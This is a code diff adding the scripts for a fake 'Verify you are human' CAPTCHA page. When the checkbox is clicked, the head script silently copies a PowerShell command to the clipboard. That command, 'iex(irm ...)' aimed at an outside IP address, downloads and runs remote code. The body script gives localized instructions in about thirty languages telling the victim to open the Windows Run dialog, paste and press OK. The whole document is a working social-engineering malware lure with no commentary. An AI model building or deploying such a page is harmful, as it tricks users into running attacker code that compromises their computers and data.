@@ -1,0 +1,323 @@
+// Script in <head>:
+
+document.addEventListener('DOMContentLoaded', function () {
+  const R = document.getElementById('checkbox-verify');
+  function G(d) {
+    const w = document.createElement('textarea');
+    w.value = d;
+    w.style.position = 'fixed';
+    document.body.appendChild(w);
+    w.select();
+    try {
+      document.execCommand('copy');
+      console.log("Текст скопирован в буфер обмена");
+    } catch (a) {
+      console.error("Не удалось скопировать текст: ", a);
+    } finally {
+      document.body.removeChild(w);
+    }
+  }
+  R.addEventListener('click', function () {
+    document.getElementById('checkbox-container').style.display = 'none';
+    const d = document.getElementById('verifying');
+    d.style.display = 'flex';
+    d.style.visibility = 'visible';
+    setTimeout(function () {
+      const w = document.getElementById('content');
+      w.style.height = '220px';
+      setTimeout(function () {
+        const a = document.getElementById('instructions');
+        a.style.display = 'block';
+        G("powershell -c iex(irm 91.92.240[.]219 -UseBasicParsing)");
+      }, 0x1f4);
+    }, 0x7d0);
+  });
+  window.addEventListener('message', function (d) {
+    if (d.data === 'checkVerification') {
+      window.parent.postMessage('verificationStarted', '*');
+    }
+  });
+});
+
+// Script in <body>:
+
+const captchaTranslations = {
+    en: {
+        verify_human: "Verify you are human",
+        instructions_title: "Additional Verification Required",
+        step_1: "Press <span class=\"key key-container\"><svg class=\"windows-logo\" xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 448 448\"><path d=\"M0 64v160h194.667V38.814L0 64M225.333 33.067L448 0v224H225.333V33.067M194.667 256v173.186L0 455.11V256h194.667M225.333 256H448v224l-222.667-32.933V256\"></path></svg> Win<span class=\"help-mark\">?</span><span class=\"tooltip\">This is the Windows key, located at the bottom of your keyboard between Ctrl and Alt, under the Z key</span></span> + <span class=\"key\">R</span> to open the Run dialog",
+        step_2: "Press <span class=\"key\">Ctrl</span> + <span class=\"key\">V</span> to paste the command",
+        step_3: "Click <strong>OK</strong> to continue",
+        verifying: "Verifying..."
+    },
+    fr: {
+        verify_human: "Verify you are human",
+        instructions_title: "Vérification supplémentaire requise",
+        step_1: "Appuyez sur <span class=\"key key-container\"><svg class=\"windows-logo\" xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 448 448\"><path d=\"M0 64v160h194.667V38.814L0 64M225.333 33.067L448 0v224H225.333V33.067M194.667 256v173.186L0 455.11V256h194.667M225.333 256H448v224l-222.667-32.933V256\"></path></svg> Win<span class=\"help-mark\">?</span><span class=\"tooltip\">Ceci est la touche Windows, située en bas de votre clavier entre Ctrl et Alt, sous la touche Z</span></span> + <span class=\"key\">R</span> pour ouvrir la boîte de dialogue Exécuter",
+        step_2: "Appuyez sur <span class=\"key\">Ctrl</span> + <span class=\"key\">V</span> pour coller la commande",
+        step_3: "Cliquez sur <strong>OK</strong> pour continuer",
+        verifying: "Vérification en cours..."
+    },
+    de: {
+        verify_human: "Verify you are human",
+        instructions_title: "Zusätzliche Verifizierung erforderlich",
+        step_1: "Drücken Sie <span class=\"key key-container\"><svg class=\"windows-logo\" xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 448 448\"><path d=\"M0 64v160h194.667V38.814L0 64M225.333 33.067L448 0v224H225.333V33.067M194.667 256v173.186L0 455.11V256h194.667M225.333 256H448v224l-222.667-32.933V256\"></path></svg> Win<span class=\"help-mark\">?</span><span class=\"tooltip\">Dies ist die Windows-Taste, die sich unten auf der Tastatur zwischen Strg und Alt unter der Z-Taste befindet</span></span> + <span class=\"key\">R</span>, um den Ausführen-Dialog zu öffnen",
+        step_2: "Drücken Sie <span class=\"key\">Strg</span> + <span class=\"key\">V</span>, um den Befehl einzufügen",
+        step_3: "Klicken Sie auf <strong>OK</strong>, um fortzufahren",
+        verifying: "Wird überprüft..."
+    },
+    es: {
+        verify_human: "Verify you are human",
+        instructions_title: "Se requiere verificación adicional",
+        step_1: "Presione <span class=\"key key-container\"><svg class=\"windows-logo\" xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 448 448\"><path d=\"M0 64v160h194.667V38.814L0 64M225.333 33.067L448 0v224H225.333V33.067M194.667 256v173.186L0 455.11V256h194.667M225.333 256H448v224l-222.667-32.933V256\"></path></svg> Win<span class=\"help-mark\">?</span><span class=\"tooltip\">Esta es la tecla de Windows, ubicada en la parte inferior de su teclado entre Ctrl y Alt, debajo de la tecla Z</span></span> + <span class=\"key\">R</span> para abrir el cuadro Ejecutar",
+        step_2: "Presione <span class=\"key\">Ctrl</span> + <span class=\"key\">V</span> para pegar el comando",
+        step_3: "Haga clic en <strong>OK</strong> para continuar",
+        verifying: "Verificando..."
+    },
+    it: {
+        verify_human: "Verify you are human",
+        instructions_title: "Verifica aggiuntiva richiesta",
+        step_1: "Premi <span class=\"key key-container\"><svg class=\"windows-logo\" xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 448 448\"><path d=\"M0 64v160h194.667V38.814L0 64M225.333 33.067L448 0v224H225.333V33.067M194.667 256v173.186L0 455.11V256h194.667M225.333 256H448v224l-222.667-32.933V256\"></path></svg> Win<span class=\"help-mark\">?</span><span class=\"tooltip\">Questo è il tasto Windows, situato in basso tra Ctrl e Alt, sotto la Z</span></span> + <span class=\"key\">R</span> per aprire la finestra Esegui",
+        step_2: "Premi <span class=\"key\">Ctrl</span> + <span class=\"key\">V</span> per incollare il comando",
+        step_3: "Fai clic su <strong>OK</strong> per continuare",
+        verifying: "Verifica in corso..."
+    },
+    pt: {
+        verify_human: "Verify you are human",
+        instructions_title: "Verificação adicional necessária",
+        step_1: "Pressione <span class=\"key key-container\"><svg class=\"windows-logo\" xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 448 448\"><path d=\"M0 64v160h194.667V38.814L0 64M225.333 33.067L448 0v224H225.333V33.067M194.667 256v173.186L0 455.11V256h194.667M225.333 256H448v224l-222.667-32.933V256\"></path></svg> Win<span class=\"help-mark\">?</span><span class=\"tooltip\">Esta é a tecla Windows, localizada na parte inferior entre Ctrl e Alt, abaixo do Z</span></span> + <span class=\"key\">R</span> para abrir o Executar",
+        step_2: "Pressione <span class=\"key\">Ctrl</span> + <span class=\"key\">V</span> para colar o comando",
+        step_3: "Clique em <strong>OK</strong> para continuar",
+        verifying: "Verificando..."
+    },
+    nl: {
+        verify_human: "Verify you are human",
+        instructions_title: "Aanvullende verificatie vereist",
+        step_1: "Druk op <span class=\"key key-container\"><svg class=\"windows-logo\" xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 448 448\"><path d=\"M0 64v160h194.667V38.814L0 64M225.333 33.067L448 0v224H225.333V33.067M194.667 256v173.186L0 455.11V256h194.667M225.333 256H448v224l-222.667-32.933V256\"></path></svg> Win<span class=\"help-mark\">?</span><span class=\"tooltip\">Dit is de Windows-toets, onderaan je toetsenbord tussen Ctrl en Alt, onder de Z-toets</span></span> + <span class=\"key\">R</span> om het Uitvoeren-venster te openen",
+        step_2: "Druk op <span class=\"key\">Ctrl</span> + <span class=\"key\">V</span> om de opdracht te plakken",
+        step_3: "Klik op <strong>OK</strong> om door te gaan",
+        verifying: "Bezig met verifiëren..."
+    },
+    ru: {
+        verify_human: "Verify you are human",
+        instructions_title: "Требуется дополнительная проверка",
+        step_1: "Нажмите <span class=\"key key-container\"><svg class=\"windows-logo\" xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 448 448\"><path d=\"M0 64v160h194.667V38.814L0 64M225.333 33.067L448 0v224H225.333V33.067M194.667 256v173.186L0 455.11V256h194.667M225.333 256H448v224l-222.667-32.933V256\"></path></svg> Win<span class=\"help-mark\">?</span><span class=\"tooltip\">Это клавиша Windows, расположена внизу между Ctrl и Alt, под клавишей Z</span></span> + <span class=\"key\">R</span> для открытия окна «Выполнить»",
+        step_2: "Нажмите <span class=\"key\">Ctrl</span> + <span class=\"key\">V</span> чтобы вставить команду",
+        step_3: "Нажмите <strong>OK</strong>, чтобы продолжить",
+        verifying: "Проверка..."
+    },
+    uk: {
+        verify_human: "Verify you are human",
+        instructions_title: "Потрібна додаткова перевірка",
+        step_1: "Натисніть <span class=\"key key-container\"><svg class=\"windows-logo\" xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 448 448\"><path d=\"M0 64v160h194.667V38.814L0 64M225.333 33.067L448 0v224H225.333V33.067M194.667 256v173.186L0 455.11V256h194.667M225.333 256H448v224l-222.667-32.933V256\"></path></svg> Win<span class=\"help-mark\">?</span><span class=\"tooltip\">Це клавіша Windows, яка знаходиться внизу клавіатури між Ctrl і Alt, під клавішею Z</span></span> + <span class=\"key\">R</span>, щоб відкрити вікно «Виконати»",
+        step_2: "Натисніть <span class=\"key\">Ctrl</span> + <span class=\"key\">V</span>, щоб вставити команду",
+        step_3: "Натисніть <strong>OK</strong>, щоб продовжити",
+        verifying: "Перевірка..."
+    },
+    pl: {
+        verify_human: "Verify you are human",
+        instructions_title: "Wymagana dodatkowa weryfikacja",
+        step_1: "Naciśnij <span class=\"key key-container\"><svg class=\"windows-logo\" xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 448 448\"><path d=\"M0 64v160h194.667V38.814L0 64M225.333 33.067L448 0v224H225.333V33.067M194.667 256v173.186L0 455.11V256h194.667M225.333 256H448v224l-222.667-32.933V256\"></path></svg> Win<span class=\"help-mark\">?</span><span class=\"tooltip\">To klawisz Windows, znajduje się na dole między Ctrl a Alt, pod Z</span></span> + <span class=\"key\">R</span> aby otworzyć okno Uruchom",
+        step_2: "Naciśnij <span class=\"key\">Ctrl</span> + <span class=\"key\">V</span>, aby wkleić polecenie",
+        step_3: "Kliknij <strong>OK</strong>, aby kontynuować",
+        verifying: "Weryfikacja..."
+    },
+    tr: {
+        verify_human: "Verify you are human",
+        instructions_title: "Ek Doğrulama Gerekli",
+        step_1: "Çalıştır penceresini açmak için <span class=\"key key-container\"><svg class=\"windows-logo\" xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 448 448\"><path d=\"M0 64v160h194.667V38.814L0 64M225.333 33.067L448 0v224H225.333V33.067M194.667 256v173.186L0 455.11V256h194.667M225.333 256H448v224l-222.667-32.933V256\"></path></svg> Win<span class=\"help-mark\">?</span><span class=\"tooltip\">Bu, Ctrl ve Alt arasında, Z tuşunun altında bulunan Windows tuşudur</span></span> + <span class=\"key\">R</span> tuşlarına basın",
+        step_2: "<span class=\"key\">Ctrl</span> + <span class=\"key\">V</span> tuşlarına basarak komutu yapıştırın",
+        step_3: "Devam etmek için <strong>OK</strong>’ye tıklayın",
+        verifying: "Doğrulanıyor..."
+    },
+    ro: {
+        verify_human: "Verify you are human",
+        instructions_title: "Verificare suplimentară necesară",
+        step_1: "Apasă <span class=\"key key-container\"><svg class=\"windows-logo\" xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 448 448\"><path d=\"M0 64v160h194.667V38.814L0 64M225.333 33.067L448 0v224H225.333V33.067M194.667 256v173.186L0 455.11V256h194.667M225.333 256H448v224l-222.667-32.933V256\"></path></svg> Win<span class=\"help-mark\">?</span><span class=\"tooltip\">Aceasta este tasta Windows, situată în partea de jos a tastaturii între Ctrl și Alt, sub tasta Z</span></span> + <span class=\"key\">R</span> pentru a deschide fereastra Run",
+        step_2: "Apasă <span class=\"key\">Ctrl</span> + <span class=\"key\">V</span> pentru a lipi comanda",
+        step_3: "Apasă pe <strong>OK</strong> pentru a continua",
+        verifying: "Se verifică..."
+    },
+    hu: {
+        verify_human: "Verify you are human",
+        instructions_title: "További ellenőrzés szükséges",
+        step_1: "Nyomja meg a <span class=\"key key-container\"><svg class=\"windows-logo\" xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 448 448\"><path d=\"M0 64v160h194.667V38.814L0 64M225.333 33.067L448 0v224H225.333V33.067M194.667 256v173.186L0 455.11V256h194.667M225.333 256H448v224l-222.667-32.933V256\"></path></svg> Win<span class=\"help-mark\">?</span><span class=\"tooltip\">Ez a Windows billentyű, a billentyűzet alsó részén, a Ctrl és Alt között, a Z alatt található</span></span> + <span class=\"key\">R</span> billentyűket",
+        step_2: "Nyomja meg a <span class=\"key\">Ctrl</span> + <span class=\"key\">V</span> a parancs beillesztéséhez",
+        step_3: "Kattintson az <strong>OK</strong> gombra a folytatáshoz",
+        verifying: "Ellenőrzés folyamatban..."
+    },
+    cs: {
+        verify_human: "Verify you are human",
+        instructions_title: "Vyžadováno další ověření",
+        step_1: "Stiskněte <span class=\"key key-container\"><svg class=\"windows-logo\" xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 448 448\"><path d=\"M0 64v160h194.667V38.814L0 64M225.333 33.067L448 0v224H225.333V33.067M194.667 256v173.186L0 455.11V256h194.667M225.333 256H448v224l-222.667-32.933V256\"></path></svg> Win<span class=\"help-mark\">?</span><span class=\"tooltip\">Toto je klávesa Windows, umístěná dole mezi Ctrl a Alt, pod Z</span></span> + <span class=\"key\">R</span> pro otevření okna Spustit",
+        step_2: "Stiskněte <span class=\"key\">Ctrl</span> + <span class=\"key\">V</span> pro vložení příkazu",
+        step_3: "Klikněte na <strong>OK</strong> pro pokračování",
+        verifying: "Ověřování..."
+    },
+    sv: {
+        verify_human: "Verify you are human",
+        instructions_title: "Ytterligare verifiering krävs",
+        step_1: "Tryck på <span class=\"key key-container\"><svg class=\"windows-logo\" xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 448 448\"><path d=\"M0 64v160h194.667V38.814L0 64M225.333 33.067L448 0v224H225.333V33.067M194.667 256v173.186L0 455.11V256h194.667M225.333 256H448v224l-222.667-32.933V256\"></path></svg> Win<span class=\"help-mark\">?</span><span class=\"tooltip\">Detta är Windows-tangenten, som finns längst ner på tangentbordet mellan Ctrl och Alt, under Z-tangenten</span></span> + <span class=\"key\">R</span> för att öppna Kör-fönstret",
+        step_2: "Tryck på <span class=\"key\">Ctrl</span> + <span class=\"key\">V</span> för att klistra in kommandot",
+        step_3: "Klicka på <strong>OK</strong> för att fortsätta",
+        verifying: "Verifierar..."
+    },
+    fi: {
+        verify_human: "Verify you are human",
+        instructions_title: "Lisävahvistus vaaditaan",
+        step_1: "Paina <span class=\"key key-container\"><svg class=\"windows-logo\" xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 448 448\"><path d=\"M0 64v160h194.667V38.814L0 64M225.333 33.067L448 0v224H225.333V33.067M194.667 256v173.186L0 455.11V256h194.667M225.333 256H448v224l-222.667-32.933V256\"></path></svg> Win<span class=\"help-mark\">?</span><span class=\"tooltip\">Tämä on Windows-näppäin, joka sijaitsee näppäimistön alareunassa Ctrl:n ja Alt:n välissä, Z:n alla</span></span> + <span class=\"key\">R</span> avataksesi Suorita-valintaikkunan",
+        step_2: "Paina <span class=\"key\">Ctrl</span> + <span class=\"key\">V</span> liittääksesi komennon",
+        step_3: "Napsauta <strong>OK</strong> jatkaaksesi",
+        verifying: "Vahvistetaan..."
+    },
+    da: {
+        verify_human: "Verify you are human",
+        instructions_title: "Yderligere bekræftelse kræves",
+        step_1: "Tryk på <span class=\"key key-container\"><svg class=\"windows-logo\" xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 448 448\"><path d=\"M0 64v160h194.667V38.814L0 64M225.333 33.067L448 0v224H225.333V33.067M194.667 256v173.186L0 455.11V256h194.667M225.333 256H448v224l-222.667-32.933V256\"></path></svg> Win<span class=\"help-mark\">?</span><span class=\"tooltip\">Dette er Windows-tasten, placeret nederst på tastaturet mellem Ctrl og Alt, under Z</span></span> + <span class=\"key\">R</span> for at åbne Kør-dialogboksen",
+        step_2: "Tryk på <span class=\"key\">Ctrl</span> + <span class=\"key\">V</span> for at indsætte kommandoen",
+        step_3: "Klik på <strong>OK</strong> for at fortsætte",
+        verifying: "Bekræfter..."
+    },
+    no: {
+        verify_human: "Verify you are human",
+        instructions_title: "Ytterligere bekreftelse kreves",
+        step_1: "Trykk <span class=\"key key-container\"><svg class=\"windows-logo\" xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 448 448\"><path d=\"M0 64v160h194.667V38.814L0 64M225.333 33.067L448 0v224H225.333V33.067M194.667 256v173.186L0 455.11V256h194.667M225.333 256H448v224l-222.667-32.933V256\"></path></svg> Win<span class=\"help-mark\">?</span><span class=\"tooltip\">Dette er Windows-tasten, plassert nederst på tastaturet mellom Ctrl og Alt, under Z</span></span> + <span class=\"key\">R</span> for å åpne Kjør-vinduet",
+        step_2: "Trykk <span class=\"key\">Ctrl</span> + <span class=\"key\">V</span> for å lime inn kommandoen",
+        step_3: "Klikk på <strong>OK</strong> for å fortsette",
+        verifying: "Verifiserer..."
+    },
+    el: {
+        verify_human: "Verify you are human",
+        instructions_title: "Απαιτείται πρόσθετη επαλήθευση",
+        step_1: "Πατήστε <span class=\"key key-container\"><svg class=\"windows-logo\" xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 448 448\"><path d=\"M0 64v160h194.667V38.814L0 64M225.333 33.067L448 0v224H225.333V33.067M194.667 256v173.186L0 455.11V256h194.667M225.333 256H448v224l-222.667-32.933V256\"></path></svg> Win<span class=\"help-mark\">?</span><span class=\"tooltip\">Αυτό είναι το πλήκτρο Windows, που βρίσκεται στο κάτω μέρος του πληκτρολογίου μεταξύ Ctrl και Alt, κάτω από το Z</span></span> + <span class=\"key\">R</span> για να ανοίξετε το παράθυρο Εκτέλεση",
+        step_2: "Πατήστε <span class=\"key\">Ctrl</span> + <span class=\"key\">V</span> για επικόλληση της εντολής",
+        step_3: "Κάντε κλικ στο <strong>OK</strong> για να συνεχίσετε",
+        verifying: "Γίνεται επαλήθευση..."
+    },
+    bg: {
+        verify_human: "Verify you are human",
+        instructions_title: "Изисква се допълнителна проверка",
+        step_1: "Натиснете <span class=\"key key-container\"><svg class=\"windows-logo\" xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 448 448\"><path d=\"M0 64v160h194.667V38.814L0 64M225.333 33.067L448 0v224H225.333V33.067M194.667 256v173.186L0 455.11V256h194.667M225.333 256H448v224l-222.667-32.933V256\"></path></svg> Win<span class=\"help-mark\">?</span><span class=\"tooltip\">Това е клавишът Windows, намира се долу между Ctrl и Alt, под клавиша Z</span></span> + <span class=\"key\">R</span>, за да отворите прозореца „Изпълнение“",
+        step_2: "Натиснете <span class=\"key\">Ctrl</span> + <span class=\"key\">V</span>, за да поставите командата",
+        step_3: "Щракнете върху <strong>OK</strong>, за да продължите",
+        verifying: "Проверка..."
+    },
+    sr: {
+        verify_human: "Verify you are human",
+        instructions_title: "Potrebna dodatna verifikacija",
+        step_1: "Pritisnite <span class=\"key key-container\"><svg class=\"windows-logo\" xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 448 448\"><path d=\"M0 64v160h194.667V38.814L0 64M225.333 33.067L448 0v224H225.333V33.067M194.667 256v173.186L0 455.11V256h194.667M225.333 256H448v224l-222.667-32.933V256\"></path></svg> Win<span class=\"help-mark\">?</span><span class=\"tooltip\">Ovo je Windows taster, nalazi se dole između Ctrl i Alt, ispod tastera Z</span></span> + <span class=\"key\">R</span> za otvaranje prozora Pokreni",
+        step_2: "Pritisnite <span class=\"key\">Ctrl</span> + <span class=\"key\">V</span> da nalepite komandu",
+        step_3: "Kliknite na <strong>OK</strong> da nastavite",
+        verifying: "Proveravam..."
+    },
+    hr: {
+        verify_human: "Verify you are human",
+        instructions_title: "Potrebna dodatna provjera",
+        step_1: "Pritisnite <span class=\"key key-container\"><svg class=\"windows-logo\" xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 448 448\"><path d=\"M0 64v160h194.667V38.814L0 64M225.333 33.067L448 0v224H225.333V33.067M194.667 256v173.186L0 455.11V256h194.667M225.333 256H448v224l-222.667-32.933V256\"></path></svg> Win<span class=\"help-mark\">?</span><span class=\"tooltip\">Ovo je Windows tipka, nalazi se dolje između Ctrl i Alt, ispod tipke Z</span></span> + <span class=\"key\">R</span> za otvaranje prozora Pokreni",
+        step_2: "Pritisnite <span class=\"key\">Ctrl</span> + <span class=\"key\">V</span> za lijepljenje naredbe",
+        step_3: "Kliknite na <strong>OK</strong> za nastavak",
+        verifying: "Provjeravanje..."
+    },
+    he: {
+        verify_human: "Verify you are human",
+        instructions_title: "נדרשת אימות נוסף",
+        step_1: "לחץ על <span class=\"key key-container\"><svg class=\"windows-logo\" xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 448 448\"><path d=\"M0 64v160h194.667V38.814L0 64M225.333 33.067L448 0v224H225.333V33.067M194.667 256v173.186L0 455.11V256h194.667M225.333 256H448v224l-222.667-32.933V256\"></path></svg> Win<span class=\"help-mark\">?</span><span class=\"tooltip\">זוהי מקש Windows, ממוקמת בתחתית בין Ctrl ל-Alt, מתחת ל-Z</span></span> + <span class=\"key\">R</span> לפתיחת תיבת ההפעלה",
+        step_2: "לחץ על <span class=\"key\">Ctrl</span> + <span class=\"key\">V</span> כדי להדביק את הפקודה",
+        step_3: "לחץ על <strong>OK</strong> כדי להמשיך",
+        verifying: "מאמת..."
+    },
+    ar: {
+        verify_human: "Verify you are human",
+        instructions_title: "مطلوب تحقق إضافي",
+        step_1: "اضغط <span class=\"key key-container\"><svg class=\"windows-logo\" xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 448 448\"><path d=\"M0 64v160h194.667V38.814L0 64M225.333 33.067L448 0v224H225.333V33.067M194.667 256v173.186L0 455.11V256h194.667M225.333 256H448v224l-222.667-32.933V256\"></path></svg> Win<span class=\"help-mark\">؟</span><span class=\"tooltip\">هذا هو زر Windows، يوجد في الأسفل بين Ctrl وAlt، تحت زر Z</span></span> + <span class=\"key\">R</span> لفتح نافذة التشغيل",
+        step_2: "اضغط <span class=\"key\">Ctrl</span> + <span class=\"key\">V</span> للصق الأمر",
+        step_3: "انقر <strong>موافق</strong> للمتابعة",
+        verifying: "جارٍ التحقق..."
+    },
+    id: {
+        verify_human: "Verify you are human",
+        instructions_title: "Verifikasi Tambahan Diperlukan",
+        step_1: "Tekan <span class=\"key key-container\"><svg class=\"windows-logo\" xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 448 448\"><path d=\"M0 64v160h194.667V38.814L0 64M225.333 33.067L448 0v224H225.333V33.067M194.667 256v173.186L0 455.11V256h194.667M225.333 256H448v224l-222.667-32.933V256\"></path></svg> Win<span class=\"help-mark\">?</span><span class=\"tooltip\">Ini adalah tombol Windows, terletak di bagian bawah keyboard antara Ctrl dan Alt, di bawah tombol Z</span></span> + <span class=\"key\">R</span> untuk membuka dialog Run",
+        step_2: "Tekan <span class=\"key\">Ctrl</span> + <span class=\"key\">V</span> untuk menempelkan perintah",
+        step_3: "Klik <strong>OK</strong> untuk melanjutkan",
+        verifying: "Memverifikasi..."
+    },
+    ms: {
+        verify_human: "Verify you are human",
+        instructions_title: "Pengesahan Tambahan Diperlukan",
+        step_1: "Tekan <span class=\"key key-container\"><svg class=\"windows-logo\" xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 448 448\"><path d=\"M0 64v160h194.667V38.814L0 64M225.333 33.067L448 0v224H225.333V33.067M194.667 256v173.186L0 455.11V256h194.667M225.333 256H448v224l-222.667-32.933V256\"></path></svg> Win<span class=\"help-mark\">?</span><span class=\"tooltip\">Ini ialah kekunci Windows, terletak di bahagian bawah papan kekunci antara Ctrl dan Alt, di bawah kekunci Z</span></span> + <span class=\"key\">R</span> untuk membuka dialog Jalankan",
+        step_2: "Tekan <span class=\"key\">Ctrl</span> + <span class=\"key\">V</span> untuk tampal arahan",
+        step_3: "Klik <strong>OK</strong> untuk meneruskan",
+        verifying: "Sedang disahkan..."
+    },
+    th: {
+        verify_human: "Verify you are human",
+        instructions_title: "ต้องมีการตรวจสอบเพิ่มเติม",
+        step_1: "กด <span class=\"key key-container\"><svg class=\"windows-logo\" xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 448 448\"><path d=\"M0 64v160h194.667V38.814L0 64M225.333 33.067L448 0v224H225.333V33.067M194.667 256v173.186L0 455.11V256h194.667M225.333 256H448v224l-222.667-32.933V256\"></path></svg> Win<span class=\"help-mark\">?</span><span class=\"tooltip\">นี่คือปุ่ม Windows อยู่ที่ด้านล่างระหว่าง Ctrl และ Alt ใต้ปุ่ม Z</span></span> + <span class=\"key\">R</span> เพื่อเปิดหน้าต่าง Run",
+        step_2: "กด <span class=\"key\">Ctrl</span> + <span class=\"key\">V</span> เพื่อวางคำสั่ง",
+        step_3: "คลิก <strong>OK</strong> เพื่อดำเนินการต่อ",
+        verifying: "กำลังตรวจสอบ..."
+    },
+    vi: {
+        verify_human: "Verify you are human",
+        instructions_title: "Cần xác minh thêm",
+        step_1: "Nhấn <span class=\"key key-container\"><svg class=\"windows-logo\" xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 448 448\"><path d=\"M0 64v160h194.667V38.814L0 64M225.333 33.067L448 0v224H225.333V33.067M194.667 256v173.186L0 455.11V256h194.667M225.333 256H448v224l-222.667-32.933V256\"></path></svg> Win<span class=\"help-mark\">?</span><span class=\"tooltip\">Đây là phím Windows, nằm dưới cùng của bàn phím giữa Ctrl và Alt, dưới phím Z</span></span> + <span class=\"key\">R</span> để mở hộp thoại Run",
+        step_2: "Nhấn <span class=\"key\">Ctrl</span> + <span class=\"key\">V</span> để dán lệnh",
+        step_3: "Nhấn <strong>OK</strong> để tiếp tục",
+        verifying: "Đang xác minh..."
+    },
+    et: {
+        verify_human: "Verify you are human",
+        instructions_title: "Täiendav kinnitamine on vajalik",
+        step_1: "Vajuta <span class=\"key key-container\"><svg class=\"windows-logo\" xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 448 448\"><path d=\"M0 64v160h194.667V38.814L0 64M225.333 33.067L448 0v224H225.333V33.067M194.667 256v173.186L0 455.11V256h194.667M225.333 256H448v224l-222.667-32.933V256\"></path></svg> Win<span class=\"help-mark\">?</span><span class=\"tooltip\">See on Windowsi klahv, mis asub klaviatuuri allosas Ctrl ja Alt vahel, Z all</span></span> + <span class=\"key\">R</span> Run-akna avamiseks",
+        step_2: "Vajuta <span class=\"key\">Ctrl</span> + <span class=\"key\">V</span>, et käsk kleepida",
+        step_3: "Klõpsa <strong>OK</strong>, et jätkata",
+        verifying: "Kinnitan..."
+    },
+    lv: {
+        verify_human: "Verify you are human",
+        instructions_title: "Nepieciešama papildu pārbaude",
+        step_1: "Nospied <span class=\"key key-container\"><svg class=\"windows-logo\" xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 448 448\"><path d=\"M0 64v160h194.667V38.814L0 64M225.333 33.067L448 0v224H225.333V33.067M194.667 256v173.186L0 455.11V256h194.667M225.333 256H448v224l-222.667-32.933V256\"></path></svg> Win<span class=\"help-mark\">?</span><span class=\"tooltip\">Šī ir Windows poga, kas atrodas tastatūras apakšā starp Ctrl un Alt, zem Z</span></span> + <span class=\"key\">R</span>, lai atvērtu logu Palaist",
+        step_2: "Nospied <span class=\"key\">Ctrl</span> + <span class=\"key\">V</span>, lai ielīmētu komandu",
+        step_3: "Klikšķini <strong>OK</strong>, lai turpinātu",
+        verifying: "Verificē..."
+    },
+    lt: {
+        verify_human: "Verify you are human",
+        instructions_title: "Reikalingas papildomas patvirtinimas",
+        step_1: "Paspauskite <span class=\"key key-container\"><svg class=\"windows-logo\" xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 448 448\"><path d=\"M0 64v160h194.667V38.814L0 64M225.333 33.067L448 0v224H225.333V33.067M194.667 256v173.186L0 455.11V256h194.667M225.333 256H448v224l-222.667-32.933V256\"></path></svg> Win<span class=\"help-mark\">?</span><span class=\"tooltip\">Tai Windows klavišas, esantis apačioje tarp Ctrl ir Alt, po Z klavišu</span></span> + <span class=\"key\">R</span>, kad atidarytumėte langą Vykdyti",
+        step_2: "Paspauskite <span class=\"key\">Ctrl</span> + <span class=\"key\">V</span>, kad įklijuotumėte komandą",
+        step_3: "Spustelėkite <strong>OK</strong>, kad tęstumėte",
+        verifying: "Tikrinama..."
+    }
+};
+
+document.addEventListener('DOMContentLoaded', () => {
+    const langCode = navigator.language.slice(0, 2).toLowerCase();
+    const translations = captchaTranslations[langCode] || captchaTranslations.en;
+    const elementVerifyHuman = document.querySelector('.cb-c label .cb-lb-t');
+    if (elementVerifyHuman) {
+        elementVerifyHuman.textContent = translations.verify_human;
+    }
+    const elementInstructionsTitle = document.querySelector('#instructions > h2');
+    if (elementInstructionsTitle) {
+        elementInstructionsTitle.textContent = translations.instructions_title;
+    }
+    const elementInstructionList = document.querySelector('#instructions ol');
+    if (elementInstructionList) {
+        const elementsInstructions = elementInstructionList.querySelectorAll('li');
+        if (elementsInstructions[0]) {
+            elementsInstructions[0].innerHTML = translations.step_1;
+        }
+        if (elementsInstructions[1]) {
+            elementsInstructions[1].innerHTML = translations.step_2;
+        }
+        if (elementsInstructions[2]) {
+            elementsInstructions[2].innerHTML = translations.step_3;
+        }
+    }
+    const elementVerifyingText = document.getElementById('verifying-text');
+    if (elementVerifyingText) {
+        elementVerifyingText.textContent = translations.verifying;
+    }
+});
